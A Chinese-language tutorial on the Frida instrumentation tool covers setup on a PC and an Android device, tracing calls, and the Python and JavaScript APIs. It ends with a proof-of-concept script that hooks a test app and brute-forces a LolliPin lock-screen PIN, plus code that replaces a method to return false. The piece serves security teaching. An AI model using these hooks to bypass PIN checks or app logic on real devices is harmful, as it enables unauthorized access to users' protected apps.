# Frida-跨平台注入工具基础篇

### 0x00 功能介绍

* * *

[官方主页](http://www.frida.re/)

[github](http://github.com/frida/)

Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android.

*   Hooking Functions
*   Modifying Function Arguments
*   Calling Functions
*   Sending messages from a target process
*   Handling runtime errors from JavaScript
*   Receiving messages in a target process
*   Blocking receives in the target process
*   ....

类似工具:Substrate/Xposed/indroid/adbi.

优势:结合python和JavaScript开发更快捷.

### 0x01 Setting up your PC

* * *

python环境+[setuptools](https://pypi.python.org/pypi/setuptools)

```
sudo easy_install frida 

```

可选:源码编译

```
$ git clone git://github.com/frida/frida.git
$ cd frida
$ make

```

#### 0x02 Testing your installation

* * *

创建一个进程用于注入:

```
$ cat

```

新建注入脚本example.py:

```
import frida
session = frida.attach("cat")
print([x.name for x in session.enumerate_modules()])

```

linux环境下需要运行如下命令:

```
$ sudo sysctl kernel.yama.ptrace_scope=0

```

用于开启非子进程的ptracing.

运行frida脚本,观察:

```
$ python example.py

```

输出结果类似如下,代码环境正常安装成功:

```
[u'cat', …, u'ld-2.15.so']

```

### 0x03 Setting up your Android device

* * *

首先下载android版frida-server:

```
$ curl -O http://build.frida.re/frida/android/arm/bin/frida-server
$ chmod +x frida-server

```

下一步部署到android设备上:

```
$ adb push frida-server /data/local/tmp/

```

### 0x04 Spin up Frida

* * *

设备上运行frida-server:

```
$ adb shell 
root@android:/ # chmod 700 frida-server  
$ adb shell 
root@android:/ # /data/local/tmp/frida-server -t 0 (注意在root下运行)

```

电脑上运行adb forward tcp转发:

```
adb forward tcp:27042 tcp:27042
adb forward tcp:27043 tcp:27043

```

27042端口用于与frida-server通信,之后的每个端口对应每个注入的进程.

运行如下命令验证是否成功安装:

```
$ frida-ps -R

```

正常情况应该输出进程列表如下:

```
PID NAME
 1590 com.facebook.katana
13194 com.facebook.katana:providers
12326 com.facebook.orca
13282 com.twitter.android
…

```

### 0x05 Tracing open() calls in Chrome

* * *

设备上打开chrome浏览器然后在pc运行如下命令:

```
$ frida-trace -R -i open com.android.chrome 
Uploading data... 
open: Auto-generated handler …/linker/open.js 
open: Auto-generated handler …/libc.so/open.js 
Started tracing 2 functions. 
Press ENTER to stop.

```

开始使用chrome app然后会发现open()调用输出如下:

```
1392 ms open()
1403 ms open()
1420 ms open()

```

现在可以实时编辑的上述JS代码来调用你的Android应用

### 0x06 Building your own tools

* * *

frida提供的几个工具frida-trace, frida-repl...绝逼非常有用,建议阅读Functions 和 Messages章节来了解Frida APIs,

首先,使用frida的API attach上需要注入的app

```
session = frida.get_remote_device().attach("com.mahh.secretsafe")

```

`session`对象允许你获取信息,同时也可以操作目标进程.比如,可以调用`enumerate_modules()`方法来获取进程中加载模块的host信息.

```
>>> print session.enumerate_modules()
[Module(name="app_process", base_address=0x40096000, size=8192, path="/system/bin/app_process"), Module(name="linker", base_address=0x4009a000, size=61440, path="/system/bin/linker"), Module(name="libcutils.so", base_address=0x400b0000, size=36864, path="/system/lib/libcutils.so"), Module(name="liblog.so", base_address=0x400bb000, size=12288, path="/system/lib/liblog.so"), Module(name="libc.so", base_address=0x400c0000, size=53248, path="/system/lib/libc.so"), Module(name="libstdc++.so", base_address=0x4011b000, size=4096, path="/system/lib/libstdc++.so"), Module(name="libm.so", base_address=0x4011e000, size=98304, path="/system/lib/libm.so")

```

然后使用Javascript API,通过`session`的create_script()方法放入JavaScript代码块.JavaScript API可以用来插桩目标app的类.在这个API中有些针对android的例子,下面是一些简单的案例:

取得一个类的js封装:

```
Dalvik.perform(function () {
    var MyClass = Dalvik.use("com.mdsec.MyClass");
});

```

如果类的构造方法有一个String对象的参数,应该用如下方式创建类的实例:

```
var MyClass = Dalvik.use("com.mdsec.MyClass");
var MyClassInstance = MyClass.$new(“MySecretString”);

```

只需要加上对应的参数就可以调用刚才新建实例的方法.例如,调用MyClass类的MyMethod方法:

```
var result = MyClassInstance.MyMethod();

```

如果想替换MyMethod方法的实现来return false,使用如下代码:

```
MyClass.MyMethod.implementation = function()
{
            return false;
};

```

Android Context(上下文)用于获取对应app相关信息以及其运行环境.所以其被广泛用于app中,需要找一种方法来访问他.获取Android Context如下代码非常有效:

```
var currentApplication = Dalvik.use("android.app.ActivityThread").currentApplication(); 
var context = currentApplication.getApplicationContext();

```

接下来需要用到上文中提到的create_script()方法用于注册这段js代码到app session中.

```
script = session.create_script(jscode)

```

为了接收从Python session中JavaScript代码返回的数据,还需要注册一个message handler.注册一个message handler先要创建方法:

```
def on_message(message, data):
print message

```

然后通过调用`on()`方法注册event handler:

```
script.on('message', on_message)

```

可以通过JS方法`send()`给message handler发送消息.例如,使用如下代码讲Context对象发送给Python客户端:

```
Dalvik.perform(function () {
    var currentApplication = Dalvik.use("android.app.ActivityThread").currentApplication();
    var context = currentApplication.getApplicationContext();
    send(context);
});

```

结果会返回app的context对象的地址:

```
{u'type': u'send', u'payload': {u'$handle': u'0x1d50079a', u'$classHandle': u'0x1d5007e6', u'$weakRef': 20}}

```

现在已经掌握frida的基础知识,现在可以实战演练如何破解[LolliPin](https://github.com/OrangeGangsters/LolliPin)锁屏库.我们创建一个使用`LolliPin`的app截图如下:

![](http://drops.javaweb.org/uploads/images/f38f712d735da3c95c623c6cddac97497aed5f21.jpg)

PIN码生效后,可以使用插桩暴力破击.要达到这个目的首先要了解pin码验证是如何实现的.AppLockImpl类中验证方法如下:

![](http://drops.javaweb.org/uploads/images/684a825f777e21038c8980b8a6c42eb765678651.jpg)

现在咱们忽略LolliPin的其他漏洞,就搞PIN码的暴露破解,这是客户端认证通过都会受到的分析.

可以创建一个AppLockImpl的实例,但是为了节约内存我们直接调用已有的.分析发现AppLockImpl被调用在LockManager的getAppLock()中,这个就仅仅返回了AppLock对象.而AppLock是抽象类AppLockImpl的具现.

![](http://drops.javaweb.org/uploads/images/c9a684ab252189df346554adb7340f46fe4907e2.jpg)

LockManager有一个帮助方法用于返回自己的实例.

![](http://drops.javaweb.org/uploads/images/828b8b1eb7d172af4b0295bdd8a37853279d7624.jpg)

结合上面的分析,咱们可以通过LockManager.getInstance()得到LockManager的实例,再调用getAppLock()得到AppLock.最后就可以调用AppLock的 checkPasscode()方法了.

```
var LockManager = Dalvik.use("com.github.orangegangsters.lollipin.lib.managers.LockManager");
var LockManagerInstance = LockManager.getInstance();
var AppLock = LockManagerInstance.getAppLock();

```

通过for循环调用checkPasscode()来达到暴力破解的目的:

```
for(var i=1230; i<1235; i++)
{
    var result = AppLock.checkPasscode(i+"");
    send(i + ": " + result);
}

```

此循环将尝试1230到1235的pin码(已知PIN为1234...),最后利用空字符串将pin码连接起来做个强制转换再打印出来.运行脚本效果如下:

```
[*] Bruteforcing PIN code
[*] Testing PIN 1230: false
[*] Testing PIN 1231: false
[*] Testing PIN 1232: false
[*] Testing PIN 1233: false
[*] Testing PIN 1234: true

```

最后完整的frida代码块如下:

```
# LolliPin bruteforce proof of concept
# Author: Dominic Chell - @domchell

import frida,sys

def print_result(message):
            print "[*] Testing PIN %s" %(message)

def on_message(message, data):
            print_result(message['payload'])

jscode = """

Dalvik.perform(function () {

    var LockManager = Dalvik.use("com.github.orangegangsters.lollipin.lib.managers.LockManager");
    var LockManagerInstance = LockManager.getInstance();
    var AppLock = LockManagerInstance.getAppLock();

    for(var i=1230; i<1235; i++)
    {
            var result = AppLock.checkPasscode(i+"");
        send(i + ": " + result);
    }
});
"""

process = frida.get_device_manager().enumerate_devices()[-1].attach("com.mahh.secretsafe")
session = process.session

script = session.create_script(jscode)
script.on('message', on_message)

print "[*] Bruteforcing PIN code"

script.load()
sys.stdin.read()

```

### 0x07 reference

* * *

[http://www.frida.re/docs/installation/](http://www.frida.re/docs/installation/)

[http://www.frida.re/docs/android/](http://www.frida.re/docs/android/)

[http://www.frida.re/docs/javascript-api/](http://www.frida.re/docs/javascript-api/)

[http://www.frida.re/docs/functions/](http://www.frida.re/docs/functions/)

[http://www.frida.re/docs/messages/](http://www.frida.re/docs/messages/)

[http://blog.mdsec.co.uk/2015/04/instrumenting-android-applications-with.html](http://blog.mdsec.co.uk/2015/04/instrumenting-android-applications-with.html)